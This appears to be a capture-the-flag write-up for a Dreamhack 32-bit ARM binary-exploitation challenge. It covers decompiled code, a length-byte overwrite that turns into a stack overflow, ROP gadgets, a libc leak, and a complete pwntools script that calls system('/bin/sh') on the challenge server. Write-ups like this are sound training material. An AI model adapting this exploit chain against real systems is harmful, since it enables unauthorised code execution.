+++
date = '2026-05-10'
draft = false
title = 'Dreamhack Arm Training-last Writeup'
ShowToc = true
tags = ["Dreamhack", "pwn"]
+++


## Challenge overview
    
ARM 단련하기

---

셸을 획득하여 /flag를 읽어주세요!
문제 수정 사항

---

2023-10-20: libc.so.6 파일이 제공됩니다.

---

Same as the previous arm challenge, we have to use old, reliable, cheap Ghidra. 

This time though, we're dealing with a 32-bit *arm training*.

![challenge-screenshot](arm.gif#center)


## Identifying the vulnerabilities

```c
undefined4 main(EVP_PKEY_CTX *param_1)

{
  ssize_t sVar1;
  int check;
  undefined1 auStack_38 [20];
  byte abStack_24 [19];
  char response [4];
  byte local_d;
  int counter;
  
  counter = 0;
  local_d = 0x14;
  init(param_1);
  while( true ) {
    printf("Let\'s Train your arm!\nAre you ready?(y/n) ");
    sVar1 = read(0,response + 1,2);
    response[sVar1] = '\0';
    check = strcmp(response + 1,"y");
    if (check != 0) break;
    puts("Gooooo~\nPress enter when you want to stop");
    do {
                    /* thats ~ */
      abStack_24[counter] = 0x7e;
      putchar((uint)abStack_24[counter]);
      counter = counter + 1;
      sleep(1);
      check = input_check();
    } while (check == 0);
    puts("OK");
  }
  puts("Noooooooo...");
  puts("Give me all your ARM Power!!");
  read(0,auStack_38,(uint)local_d);
  return 0;
}
```

```c
undefined4 input_check(void)

{
  int chestie;
  undefined4 ret;
  
  chestie = poll((pollfd *)&fds,1,0);
  if (chestie < 1) {
    ret = 0;
  }
  else {
    do {
      chestie = getchar();
    } while (chestie != 10);
    ret = 1;
  }
  return ret;
}
```

The most bizarre thing here is the `poll`. A [word](https://linuxhint.com/use-poll-system-call-c/) about it:

> `int poll (struct pollfd *fds, nfds_t nfds, int timeout);`
> 
> The poll() function polls one or more open files. The main feature of this function is that it supports polling multiple files and can be used as a query or wait function in read and write operations on pipes, sockets, shared memory objects, and common files.
>
> The “fds” input argument specifies the pointer to an array of pointers to structures of pollfd type. Each polled file must have its own structure with a pointer to the array. 
>
> The “nfds” input argument specifies the number of pointers to the “pollfd” structures that the array contains
>
> The input argument timeout specifies the query mode. If this parameter is sent with 0, poll() performs a simple query without waiting. 
>
> When the poll() function generates an error, it returns -1 in its output argument. In query mode, the poll() function returns the number of “pollfd” structures with positive results.

But the pointer seems undefined...Is that 0 for `stdin`? 

So it should return `-1` every time, unless we input something.

Otherwise, `input_check` just seems to eat characters until you *enter*. When you do that, it returns `1` and escapes the `do while()`. 

After that, we get to write `0x14` into the `auStack_38`, which is of size `0x14`. So not that much to do here...

What *should* happen is that `abStack_24` should overflow but with garbage data. It just hit me as I was writing this; We can have it overflow `local_d`, change the amount of bytes we can write into `auStack_38` and allowing us a proper buffer overflow. We only have a byte though. That's fine.

That's `19 * ~` for `abStack_24`, `4 * ~` for `response`, and the next one is `local_d`. If it overflows into the following values a little, it's not that big of a deal.

The ELF starts at `0x10000`! That's really strange! I genuinely though I was dealing with offsets, not real addresses, for a while. Let's try using some gadgets.

```bash
0x00010480: pop {r3, pc}
0x000106e4: mov r0, r3; pop {r11, pc};
```

I whipped up this payload, and we got a successful leak!!!!!!

```python
payload = ( b"A" * 20 + #auStack38
            b"B" * 19 + #abStack_24
            b"C" * 4 + #response
            b"\xff" + #local_d
            b"D" * 4  + #counter
            b"E" * 4 + #rbp/r11
            p32(pop_r3_pc) + 
            p32(puts_got) +
            p32(mov_r0_r3_pop_r11_pc) +
            p32(0x0) +
            p32(puts_plt)
            )
```

```bash
starting counter now
len of payload is 0x48
[*] Switching to interactive mode
\xf0k\xe8?\x84\x04\x01
[*] Got EOF while reading in interactive
$  
```

Now, we just need to do this again, except calling `system`. I tried to go back to `main` (failed though).

But, as I ran this twice, failing to reach `main`, I got the same `libc` offset... Is this also statically linked? That would make everything a lot easier...

I assumed it was, crafted a new payload, and...

```python
leaked_puts = 0x3fe86bf0
libc.address = leaked_puts - libc.sym[b"puts"]
system = libc.sym[b"system"]
binsh = next(libc.search(b"/bin/sh"))
```

Well, it was! I ran the exploit remotely, and got the flag!

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
import time
elf = ELF('/home/kali/Downloads/dreamhack/armtraining/arm_training-last')
libc = ELF('/home/kali/Downloads/dreamhack/armtraining/libc.so.6')

context.arch = 'arm'
cyberedu = 'host8.dreamhack.games:14341'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    

puts_got = elf.got[b"puts"]
puts_plt = elf.plt[b"puts"]
leaked_puts = 0x3fe86bf0

libc.address = leaked_puts - libc.sym[b"puts"]
system = libc.sym[b"system"]
binsh = next(libc.search(b"/bin/sh"))

p.recvuntil(b") ")
p.sendline(b"y")

p.recvuntil(b"stop")
print("starting counter now")
sleep(26)
p.sendline()

p.recvuntil(b") ")
p.sendline(b"n")

p.recvuntil(b"!\n")

pop_r3_pc = 0x00010480
mov_r0_r3_pop_r11_pc = 0x000106e4
main = 0x106f4

payload = ( b"A" * 20 + #auStack38
            b"B" * 19 + #abStack_24
            b"C" * 4 + #response
            b"\xff" + #local_d
            b"D" * 4  + #counter
            b"E" * 4 + #rbp/r11
            p32(pop_r3_pc) + 
            p32(binsh) +
            p32(mov_r0_r3_pop_r11_pc) +
            p32(0x0) +
            p32(system) 
            )
           
print(f"len of payload is {hex(len(payload))}")
      
p.sendline(payload)

#data = p.recv(4)
#val = u32(data.ljust(4, b"\x00"))
#print(f"leaked is {hex(val)}")

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/dreamhack/armtraining.py)**.
